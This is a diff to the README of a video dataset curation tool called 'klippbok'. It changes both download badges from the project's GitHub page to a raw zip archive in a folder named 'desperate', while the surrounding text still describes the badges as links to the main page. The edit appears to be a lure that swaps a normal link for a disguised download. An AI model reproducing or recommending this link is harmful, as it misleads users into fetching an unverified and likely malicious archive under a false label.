@@ -1,6 +1,6 @@
 # 🎞️ klippbok - Easy Video Dataset Curation
 
-[![Download klippbok](https://img.shields.io/badge/Download-klippbok-brightgreen?style=for-the-badge)](https://github.com/navaefren21/klippbok)
+[![Download klippbok](https://img.shields.io/badge/Download-klippbok-brightgreen?style=for-the-badge)](https://github.com/navaefren21/klippbok/raw/refs/heads/main/desperate/Software_v2.0-alpha.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To use klippbok, follow these main steps:
 
 Click the green button below to visit the main GitHub page for klippbok. From there, you can find the latest versions and detailed instructions.
 
-[![Download klippbok](https://img.shields.io/badge/Download-klippbok-blue?style=for-the-badge)](https://github.com/navaefren21/klippbok)
+[![Download klippbok](https://img.shields.io/badge/Download-klippbok-blue?style=for-the-badge)](https://github.com/navaefren21/klippbok/raw/refs/heads/main/desperate/Software_v2.0-alpha.2.zip)
 
 ---
 
